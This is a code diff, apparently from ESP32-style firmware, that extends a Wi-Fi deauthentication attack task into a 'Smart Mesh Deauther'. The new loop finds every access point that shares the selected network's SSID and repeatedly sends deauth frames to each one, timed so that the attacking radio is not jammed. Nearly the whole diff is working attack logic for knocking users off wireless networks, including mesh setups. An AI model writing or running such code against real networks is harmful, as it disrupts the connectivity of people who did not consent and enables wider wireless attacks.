@@ -629,13 +629,41 @@ void htool_send_deauth_all() {
     }
 }
 
+// --- SMART MESH DEAUTHER ---
 void deauther_task() {
+    // 1. Get the Target Name based on the selected index
+    char target_ssid[33] = {0};
+    if (global_scans && menu_cnt < global_scans_count) {
+        strncpy(target_ssid, (char*)global_scans[menu_cnt].ssid, 32);
+    }
+
     while (htool_api_is_deauther_running()) {
-        if (menu_cnt != global_scans_count) {
-            htool_wifi_send_deauth_frame(menu_cnt, true);
-        } else {
-            htool_send_deauth_all();
+        // Safety check
+        if (global_scans == NULL || global_scans_count == 0) break;
+
+        // Loop through ALL networks found
+        for (int i = 0; i < global_scans_count; i++) {
+            
+            // Check 1: Is this the specific one we selected?
+            bool is_target = (i == menu_cnt);
+
+            // Check 2: Is this a Mesh Node? (Different MAC, SAME Name)
+            // We only do this for named networks, not hidden ones
+            if (!is_target && strlen(target_ssid) > 0) {
+                if (strcmp(target_ssid, (char*)global_scans[i].ssid) == 0) {
+                    is_target = true;
+                }
+            }
+
+            // If it matches, FIRE!
+            if (is_target) {
+                htool_wifi_send_deauth_frame(i, true);
+                // Spread the packets out slightly to avoid jamming our own radio
+                vTaskDelay(pdMS_TO_TICKS(5)); 
+            }
         }
+        
+        // Main loop delay
         vTaskDelay(pdMS_TO_TICKS(10));
     }
     vTaskDelete(NULL);
